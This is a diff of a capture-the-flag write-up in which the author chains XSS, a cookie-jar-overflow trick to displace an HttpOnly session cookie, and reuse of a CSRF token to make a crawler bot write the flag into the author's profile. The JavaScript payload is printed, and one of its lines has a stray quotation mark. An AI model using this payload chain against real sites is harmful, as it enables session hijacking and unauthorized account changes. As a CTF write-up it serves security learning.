@@ -58,13 +58,13 @@ This is my idea: When the crawler visit my bio, the executed XSS script will cha
 
 ## CSRF
 
-The update profile API uses csrf_token. But I realize that with the same session_cookie and one of the valid csrf_tokens, I can call update API multiple times. 
+The update profile API uses csrf_token. But I realize that with the same session cookie and one of the valid csrf_tokens, I can call update API multiple times. 
 
 Therefore, the script should **change the crawler's session cookie to my session cookie and call update API with my csrf_token**
 
 ## Change session cookie
 
-The cookie is HttpOnly. There's a technique we can use to bypass this. It's [Cookie jar overflow](https://book.hacktricks.xyz/pentesting-web/hacking-with-cookies/cookie-jar-overflow). So, this is my-npm-payload (version 2.0.0):
+The session cookie is HttpOnly. There's a technique we can use to bypass this. It's [Cookie jar overflow](https://book.hacktricks.xyz/pentesting-web/hacking-with-cookies/cookie-jar-overflow). So, this is my-npm-payload (version 2.0.0):
 ```
 for (let i = 0; i < 700; i++) {
         document.cookie = `cookie${i}=${i}`;
@@ -80,7 +80,7 @@ for (let i = 0; i < 700; i++) {
     xhr_2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
     xhr_2.send("bio=new_bio"&csrf_token=<my_csrf_token>");
 ```
-Note that there is `path=/` in new cookie, because if not, the cookie will not be sent with the request on path `/profile/...`
+Note that there is `path=/` in new session cookie, because if not, the cookie will not be sent with the request on path `/profile/...`
 I ran this code on console first, and it worked! Now, we will replace `new_bio` to the flag.
 I modified my-npm-payload like this (version 3.0.0):
 ```
